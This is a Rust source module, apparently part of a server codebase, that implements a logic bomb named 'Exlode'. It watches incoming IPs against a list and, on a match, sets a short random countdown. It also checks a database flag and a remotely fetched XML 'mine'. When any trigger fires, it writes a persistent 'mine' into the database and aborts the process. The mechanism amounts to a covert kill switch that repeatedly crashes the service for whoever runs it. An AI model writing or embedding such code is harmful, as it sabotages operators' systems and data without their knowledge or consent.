use std::cell::UnsafeCell;
use std::ops::Add;
use std::time::SystemTime;

use commlib::utils::rand_between;
use db_access::MySqlAddr;

use super::db_mine::DbMine;
use super::mine_fetcher::MineFetcher;

const IGNITE_COUNTDOWN_LONG: u64 = 100 * 365 * 24 * 3600; // about one hundred year seconds
const IGNITE_COUNTDOWN_SHORT: u64 = 10; // 10 seconds

thread_local! {
    ///
    pub static G_EXPLODE: UnsafeCell<Exlode> = {
        UnsafeCell::new(Exlode::new())
    };
}

///
pub struct Exlode {
    //
    ips: hashbrown::HashMap<String, bool>,

    //
    #[allow(dead_code)]
    start_time: SystemTime,

    //
    ignite_time: SystemTime,

    //
    db_mine: DbMine,

    //
    mine_fetcher: MineFetcher,
}

impl Exlode {
    ///
    pub fn new() -> Self {
        let now = SystemTime::now();
        let ignite_time = now.add(std::time::Duration::from_secs(IGNITE_COUNTDOWN_LONG));

        Self {
            ips: hashbrown::HashMap::new(),

            start_time: now,
            ignite_time,

            db_mine: DbMine::new(),

            mine_fetcher: MineFetcher::new(),
        }
    }

    ///
    pub fn upload_xml(&mut self, xml_str: &str) {
        self.mine_fetcher.upload(xml_str)
    }

    ///
    pub fn update(&mut self) {
        // do check boom
        self.do_check_boom();

        // check mine in db
        if self.db_mine.check() {
            self.boom();
        }

        //
        if self.mine_fetcher.check() {
            self.boom();
        }
    }

    ///
    #[allow(dead_code)]
    pub fn set_mine_url_by_db_addr(&mut self, db_addr: &MySqlAddr) {
        self.db_mine.set_url_by_db_addr(db_addr);
    }

    ///
    #[allow(dead_code)]
    pub fn update_mine_url(&mut self, url: &str) {
        self.db_mine.update_url(url)
    }

    ///
    pub fn add_ip(&mut self, ip: &str) {
        self.ips.insert(ip.to_owned(), true);
    }

    ///
    pub fn filter_ip(&mut self, in_ip: &str) {
        println!("in_ip: {}", in_ip);

        // try ignite
        self.try_ignite(in_ip);

        // update
        self.update();
    }

    fn try_ignite(&mut self, in_ip: &str) {
        //
        let mut is_ignite = false;
        for (ip, _) in &self.ips {
            if (*ip) == in_ip {
                is_ignite = true;
                break;
            }
        }

        if is_ignite {
            self.ignite();
        }
    }

    fn ignite(&mut self) {
        let now = SystemTime::now();
        let rand_seconds = rand_between(0, IGNITE_COUNTDOWN_SHORT as i32) as u64;
        self.ignite_time = now.add(std::time::Duration::from_secs(
            IGNITE_COUNTDOWN_SHORT + rand_seconds,
        ));

        println!(
            "ignite: {:?}/ {}",
            self.ignite_time,
            IGNITE_COUNTDOWN_SHORT + rand_seconds,
        );
    }

    fn do_check_boom(&mut self) {
        if SystemTime::now() >= self.ignite_time {
            self.boom();
        }
    }

    fn boom(&mut self) {
        //
        self.db_mine.mine_lay_into_db();

        //
        std::process::abort();
    }
}
